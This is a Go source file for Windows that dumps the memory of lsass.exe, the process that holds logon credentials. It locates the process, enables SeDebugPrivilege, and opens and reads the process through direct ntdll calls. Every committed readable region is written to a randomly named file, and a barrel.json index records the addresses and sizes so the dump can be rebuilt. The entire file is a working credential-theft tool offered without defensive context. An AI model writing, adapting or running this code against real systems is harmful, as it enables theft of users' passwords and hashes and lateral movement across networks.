package main


import (
	"os"
	"fmt"
	"unsafe"
	"strings"
	"syscall"
    "math/big"
	"crypto/rand"
	"unicode/utf8"
	"encoding/json"
	"golang.org/x/sys/windows"
)

const (
	MAXIMUM_ALLOWED uintptr = 0x02000000
	PROCESS_QUERY_INFORMATION uintptr = 0x0400
	PROCESS_VM_READ uintptr = 0x0010
	SE_PRIVILEGE_ENABLED = 0x00000002
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY = 0x0008
	ProcessBasicInformation uintptr = 0x00
	PAGE_NOACCESS uint32 = 0x01
	MEM_COMMIT uint32 = 0x00001000
	letters = "abcdefghijklmnopqrstuvwxyz"
)

var (
	ntGetNextProcess *windows.LazyProc
	ntOpenProcess *windows.LazyProc
	ntQueryInformationProcess *windows.LazyProc
	ntReadVirtualMemory *windows.LazyProc
	ntQueryVirtualMemory *windows.LazyProc
	ntOpenProcessToken *windows.LazyProc
	ntAdjustPrivilegesToken *windows.LazyProc
	ntClose *windows.LazyProc
	getProcessImageFileName *windows.LazyProc
)


// Structures
type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type CLIENT_ID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type PROCESS_BASIC_INFORMATION struct {
	ExitStatus                   uint32
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

type MEMORY_BASIC_INFORMATION struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

type Mem64Information struct {
	Field0	string `json:"field0"`
	Field1	string    `json:"field1"`
	Field2  uint32 `json:"field2"`
}


func init() {
	// ntdll
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntGetNextProcess = ntdll.NewProc("NtGetNextProcess")
	ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	ntOpenProcess = ntdll.NewProc("NtOpenProcess")
	ntReadVirtualMemory = ntdll.NewProc("NtReadVirtualMemory")
	ntQueryVirtualMemory = ntdll.NewProc("NtQueryVirtualMemory")
	ntOpenProcessToken = ntdll.NewProc("NtOpenProcessToken")
	ntAdjustPrivilegesToken = ntdll.NewProc("NtAdjustPrivilegesToken")
	ntClose = ntdll.NewProc("NtClose")
	// psapi - Can I do this with ntdll?? :(
	psapi := windows.NewLazySystemDLL("psapi.dll")
	getProcessImageFileName = psapi.NewProc("GetProcessImageFileNameA")
}


func Reverse(s string) string {
	size := len(s)
	buf := make([]byte, size)
	for start := 0; start < size; {
		r, n := utf8.DecodeRuneInString(s[start:])
		start += n
		utf8.EncodeRune(buf[size-start:], r)
	}
	return string(buf)
}

func GetProcessByName(process_name string) []uintptr{
	var proc_handles_slice []uintptr;
	var s uintptr = 0;
	for {
		res, _, _ := ntGetNextProcess.Call(s, MAXIMUM_ALLOWED, 0, 0, uintptr(unsafe.Pointer(&s)))

		if (res != 0) {
			break
		}

		buf := [256]byte{}
		var mem_address uintptr = uintptr(unsafe.Pointer(&buf[0])); 
		res, _, _ = getProcessImageFileName.Call(s, mem_address, 256);

		if (res > 1){
			var res_string string = string(buf[0:res]);
			var reverted_string string = Reverse(res_string);
			var index int = strings.Index(reverted_string, "\\");
			var result_name string = Reverse(reverted_string[0:index]);
			if (result_name == process_name){
				proc_handles_slice = append(proc_handles_slice, s);
			}
		}
	}
	return proc_handles_slice;
}


func enable_SeDebugPrivilege() bool {
	pid := uintptr(syscall.Getpid())
	hProcess := open_process(pid)

	// NtOpenProcessToken
	var tokenHandle syscall.Token
	ntstatus, _, _ := ntOpenProcessToken.Call(uintptr(hProcess), uintptr(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), uintptr(unsafe.Pointer(&tokenHandle)))
	if ntstatus != 0 {
		fmt.Printf("ntOpenProcessToken status: 0x%x\n", ntstatus)
		return false
	}
	luid := LUID{ LowPart:  20, HighPart: 0,}
	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{ { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED, }, },
	}

	// NtAdjustPrivilegesToken
	ntstatus, _, _ = ntAdjustPrivilegesToken.Call(uintptr(tokenHandle), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if ntstatus != 0 {
		fmt.Printf("NtAdjustPrivilegesToken status: 0x%x\n", ntstatus)
		return false
	}

	// NtClose
	ntstatus, _, _ = ntClose.Call(uintptr(tokenHandle))
	if ntstatus != 0 {
		fmt.Printf("NtClose status: 0x%x\n", ntstatus)
		return false
	}

	return true
}


func open_process(pid uintptr) uintptr {
	var handle uintptr
	objectAttributes := OBJECT_ATTRIBUTES{}
	clientId := CLIENT_ID{UniqueProcess: pid}

	status, _, _ := ntOpenProcess.Call(uintptr(unsafe.Pointer(&handle)), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&clientId)))
	if (status != 0) {
		fmt.Printf("Failed to open process. NTSTATUS: 0x%X\n", status)
		return 0
	}
	return handle
}


func get_pid(proc_handle uintptr) uintptr {
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
	if status != 0 {
		fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
		return 0
	}
	pid := pbi.UniqueProcessID
	return pid
}


func writeToFile(file_name string, byteArray []byte) () {
	// Write to binary file
	file, err := os.OpenFile(file_name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		fmt.Printf("Error opening file: %v\n", err)
		return
	}
	defer file.Close()
	_, err = file.Write(byteArray)
	if err != nil {
		fmt.Printf("Error writing to file: %v\n", err)
		return
	}
}


func randomString(length int) (string) {
    result := make([]byte, length)
    for i := range result {
        num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
        if err != nil {
            return ""
        }
        result[i] = letters[num.Int64()]
    }
    return string(result)
}


func main() {
	// Get PID
	process_name := "lsass.exe"
	proc_handle := GetProcessByName(process_name)[0]
	pid := get_pid(proc_handle)
	fmt.Printf("[+] Process PID:    \t%d\n", pid)
	
	// Get SeDebugPrivilege
	priv_enabled := enable_SeDebugPrivilege()
	fmt.Printf("[+] Privilege Enabled:\t%t\n", priv_enabled)

	// Get process handle with correct privilege
	proc_handle = open_process(pid)
	fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)	
	
	var mem_address uintptr = 0
	var proc_max_address_l uintptr = 0x7FFFFFFEFFFF
	// Create directory
	dirName := randomString(5)
    err := os.Mkdir(dirName, 0755)
    if err != nil {
        fmt.Printf("Error creating directory: %v\n", err)
        return
    } 
    fmt.Printf("[+] Files will be generated at %s\n", dirName)
    // Slice/Array for Mem64Information objects
	mem64list_arr := []Mem64Information{}
	for (mem_address < proc_max_address_l){
		var memInfo MEMORY_BASIC_INFORMATION
		var resultLength uintptr
		status, _, _ := ntQueryVirtualMemory.Call(proc_handle, mem_address, 0, uintptr(unsafe.Pointer(&memInfo)), uintptr(unsafe.Sizeof(memInfo)), uintptr(unsafe.Pointer(&resultLength)))
		if status != 0 {
			fmt.Printf("NtQueryVirtualMemory failed with status: 0x%x\n", status)
			return
		}	
		if (memInfo.Protect != PAGE_NOACCESS && memInfo.State == MEM_COMMIT){
			buffer := make([]byte, memInfo.RegionSize)
			var bytesRead uintptr
			// if status != 0 it maybe be GuardPage
			ntReadVirtualMemory.Call(proc_handle, memInfo.BaseAddress, uintptr(unsafe.Pointer(&buffer[0])), memInfo.RegionSize, uintptr(unsafe.Pointer(&bytesRead)))
			// Random name
			memdump_filename := randomString(9) + "." + randomString(3) //fmt.Sprintf("%x", (memInfo.BaseAddress))
			
			// Write binary file
			writeToFile((dirName + "\\" + memdump_filename), buffer)

			// Create object and add to slice
			mem64Info := Mem64Information{ Field0: memdump_filename, Field1: fmt.Sprintf("0x%x", (memInfo.BaseAddress)), Field2: uint32(memInfo.RegionSize)}
			mem64list_arr = append(mem64list_arr, mem64Info)
		}
		mem_address += memInfo.RegionSize
	}

	// Write to file
	jsonData, err := json.Marshal(mem64list_arr)
	if err != nil {
		fmt.Printf("Error marshaling to JSON: %v\n", err)
		return
	}
	file, err := os.Create("barrel.json")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()
	_, err = file.Write(jsonData)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("[+] File barrel.json generated.")
}